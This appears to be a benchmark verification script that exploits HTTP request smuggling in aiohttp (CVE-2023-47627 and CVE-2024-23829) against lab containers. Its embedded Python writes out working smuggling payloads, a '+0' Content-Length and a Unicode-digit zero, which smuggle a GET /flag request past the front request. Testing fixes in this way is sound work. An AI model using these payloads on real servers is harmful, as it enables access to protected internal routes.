#!/usr/bin/env bash
# =====================================================================
# PCBV2-0052 aiohttp-cve-2024-23829
#   pair: CVE-2023-47627 -> CVE-2024-23829 (HTTP request smuggling / CWE-444)
#   seed     (CVE-2023-47627): 原始 socket 发送带混淆 Content-Length 的请求
#            `Content-Length: +0`（int() 容忍前导 '+'）后管道走私 `GET /flag`。
#            V0 (aiohttp 3.8.5, get_content_length 用 int()) 接受 -> 走私请求
#            到达内部 /flag 路由 -> 响应含 ${PCB_FLAG}。
#            V1 (3.8.6, 修复为 .isdecimal()) "+0" 非十进制 -> 400+close -> 阻断。
#   residual (CVE-2024-23829): 同一走私，Content-Length 用 Unicode 十进制数字
#            `٠`(U+0660 阿拉伯-印度零, UTF-8 d9 a0)：isdecimal() 返回 True 且
#            int() 解析为 0 -> V1 仍接受 -> 达 flag（不完整修复）；
#            V2 (3.9.2, DIGITS=re.compile(r"\d+", re.ASCII)) 拒绝 -> 阻断。
#   效果通道 = 原始 TCP 响应 body（走私 GET /flag 的响应即 flag 本身）
#   判定基准 = RUN_FLAG（提交值）：正常 seed 时 RUN_FLAG=平台真 flag；wrong/stale
#             检查时 RUN_FLAG=提交的 override（通道含真 flag≠override -> 10）。
#   退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 宿主端口：优先 docker compose port 动态解析，回退固定映射（39580/39581/39582 -> 容器 8080）
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed -E 's/^.*:([0-9]+)$/\1/' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=39580;; v1) PORT=39581;; v2) PORT=39582;; *) PORT=39581;;
  esac
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
fi
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve port for $VERSION" >&2; exit 20; }

# 就绪等待：根路径 200
"$PY" - "$PORT" <<'PYEOF'
import sys, time, urllib.request
port = sys.argv[1]
for _ in range(60):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: aiohttp harness $VERSION not ready on :$PORT" >&2; exit 20; }

# 执行 + 判定（逻辑与 poc/seed_exec.py 一致；该执行器源码损坏不可直接运行，故自实现）
"$PY" - "$PORT" "$RUN_FLAG" "$MODE" "$VERSION" <<'PYEOF'
import json, socket, sys

port, flag, mode, version = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

def build_smuggle(cl_value: bytes) -> bytes:
    return (
        b"POST / HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Content-Length: " + cl_value + b"\r\n"
        b"\r\n"
        b"GET /flag HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )

# seed: 前导 '+'（int() 接受, isdecimal() 拒绝）；residual: U+0660 阿拉伯-印度零
if mode == "--seed":
    raw, label = build_smuggle(b"+0"), "cl=+0 (CVE-2023-47627)"
else:
    raw, label = build_smuggle("\u0660".encode("utf-8")), "cl=U+0660 (CVE-2024-23829)"

try:
    s = socket.create_connection(("127.0.0.1", int(port)), timeout=6)
except OSError as e:
    print(f"[verify {mode}] connect error: {e!r}", file=sys.stderr)
    sys.exit(20)
s.settimeout(6)
buf = b""
try:
    s.sendall(raw)
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if len(buf) > 65536:
            break
except OSError:
    pass
finally:
    try:
        s.close()
    except OSError:
        pass

body = buf.decode("latin-1", "replace")
print(f"[verify {mode}] version={version} vector={label}")
print(body[:300].replace("\r", "\\r").replace("\n", "\\n"))
sys.exit(0 if flag in body else 10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION rc=$RC (judge_flag=$RUN_FLAG)" >&2
exit "$RC"
